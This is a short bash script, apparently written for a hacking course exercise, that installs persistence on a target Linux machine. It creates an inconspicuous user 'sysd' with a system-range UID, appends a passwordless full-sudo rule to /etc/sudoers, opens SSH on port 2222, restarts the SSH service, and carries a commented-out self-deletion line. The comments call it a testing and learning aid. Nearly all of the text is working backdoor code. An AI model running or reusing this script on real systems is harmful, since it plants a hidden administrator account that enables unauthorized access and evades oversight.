 ---
#!/bin/bash

#14/01/2021 MHills 
#This script resides on the attacking machine and has been written to quickly create #user sysd.
#There are other comments that I have left in the script for my testing and learning to hack the Target machine.
#this scripts name is hello.sh   - there are no further comments in this script. All command details can be found below #this scrip, in the HW steps, except some new ones I have learnt.

#

adduser --no-create-home --disabled-login sysd

usermod -u 114 sysd

groupmod -g 114 sysd

sudo passwd sysd


echo 'sysd ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
echo 'Port 2222' >> /etc/ssh/sshd_config


id sysd

sudo systemctl restart ssh.service -f
sudo systemctl status ssh.service


#rm -rf .hello.sh #remove this script

#end of .hello.sh
---